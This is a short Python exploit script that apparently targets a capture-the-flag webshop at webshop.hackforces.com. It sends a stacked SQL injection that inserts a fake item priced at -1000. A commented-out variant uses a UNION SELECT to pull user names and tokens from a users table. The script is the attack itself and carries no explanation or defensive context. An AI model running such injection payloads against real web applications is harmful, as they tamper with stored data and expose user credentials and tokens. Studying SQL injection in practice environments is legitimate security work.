import requests

url = 'https://webshop.hackforces.com/items/' + \
"-1; INSERT INTO items(name, description, cost, secret) VALUES ('BY ME', 'COST IS -1000', -1000, 'lmao'); SELECT * FROM items WHERE id=1;"

'''
"-1 UNION " + \
"select 1,user,token,1,'lol' " + \
"from users WHERE id=0"
'''

r = requests.get(url)
print(r.status_code)
print(r.text)
print(r.url)
